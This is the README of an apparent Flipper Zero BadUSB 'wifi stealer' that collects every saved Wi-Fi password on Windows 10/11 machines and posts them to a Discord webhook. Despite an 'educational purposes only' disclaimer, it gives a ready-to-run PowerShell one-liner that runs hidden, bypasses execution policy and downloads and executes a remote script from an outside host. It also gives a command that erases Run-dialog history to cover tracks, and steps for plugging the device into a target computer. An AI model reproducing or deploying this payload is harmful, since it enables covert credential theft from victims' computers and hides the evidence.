## :warning: This script was made for educational purposes only and is not meant to be used maliciously.

This script is a wifi stealer that sends every wifi passwords stored on a Windows 10/11 computer to a [discord webhook](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks).

It is made to be used with a [Flipper Zero](https://flipperzero.one/) device, using the [BadUSB](https://docs.flipperzero.one/bad-usb) feature.

# Files
### Powershell script
- `Wifi-Stealer-Discord.ps1` - The main script, commented for readability
### Duckyscript file
- `Wifi-Stealer-Discord_Quick.txt` - A duckyscript version of the script using a minified/efficient version of the script (for Flipper Zero) pulling from webpage powershell script; it also clears run prompt history.

### Dependencies
* An internet connection
* Windows 10,11

# Usage
Replace `https://discord.com/api/webhooks/<channel_id>/<webhook_id>` with your own [webhook url](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks).
### Powershell
```powershell
powershell -w h -ep bypass $discord='https://discord.com/api/webhooks/<channel_id>/<webhook_id>';irm winwifidiscord.remothe.dev | iex

powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue" | iex
```

### Flipper Zero
1. Copy the `Wifi-Stealer-Discord_Quick.txt` file to the Flipper Zero in the `badusb` folder, directly to the microSD card or using the [Flipper Zero app](https://docs.flipperzero.one/mobile-app) *(Android/iOS)* or [qFlipper](https://docs.flipperzero.one/qflipper) *(Windows/Linux/MacOS)*
2. Plug the Flipper Zero to the target computer
3. You must have internet access in order for the .txt file's script in order to connect to the last bit `winwifidiscord.remothe.dev` and allow it to execute.
4. Run the script from the Flipper Zero in the `Bad USB` menu

# Result
![image](https://user-images.githubusercontent.com/54336210/251186081-3aa3261c-d14d-4ae1-a1ef-136f005d8705.png)

## Credits

- [RemoTheDev](https://remothe.dev) - Modified script and deleted redundancies for subjectively more efficient use and less space.
- [AlexZeGamer](https://gist.github.com/AlexZeGamer) - BadUSB script foundation
